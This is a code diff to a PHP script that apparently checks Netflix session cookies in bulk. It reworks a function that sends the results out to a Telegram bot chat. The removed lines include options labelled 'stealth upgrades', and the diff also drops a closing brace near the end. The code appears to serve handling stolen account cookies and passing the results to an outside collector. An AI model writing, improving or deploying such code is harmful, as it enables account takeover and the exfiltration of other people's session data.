@@ -17,41 +17,37 @@ function extractNetflixId($cookie) {
 
     return "N/A";
 }
-
+//SEND TO TELEGRAM
 function sendToTelegram($text) {
     $botToken = getenv('TG_BOT_TOKEN');
     $chatId = getenv('TG_CHAT_ID');
 
-    $url = "https://api.telegram.org/bot{$botToken}/sendDocument";
-
-    $filePath = tempnam(sys_get_temp_dir(), 'result_') . '.txt';
-    file_put_contents($filePath, $text);
+    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
 
     $postFields = [
         'chat_id' => $chatId,
-        'document' => new CURLFile($filePath, 'text/plain', 'results.txt'),
-        'caption' => "✅ Bulk Results"
+        'text' => $text
     ];
 
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true); // ✅ REQUIRED
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
-      // 🔒 stealth upgrades
-    curl_setopt($ch, CURLOPT_VERBOSE, false);
-    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $postFields,
+        CURLOPT_TIMEOUT => 20
+    ]);
 
     $response = curl_exec($ch);
-    curl_close($ch);
 
-    unlink($filePath);
+    if ($response === false) {
+        error_log("Telegram Error: " . curl_error($ch));
+    }
+
+    curl_close($ch);
 
     return $response;
 }
-
-
 
 //ORIGINAL
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -121,7 +117,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     echo $response;
     exit;
  }
-}
 ?>
 <!DOCTYPE html>
 <html lang="en">
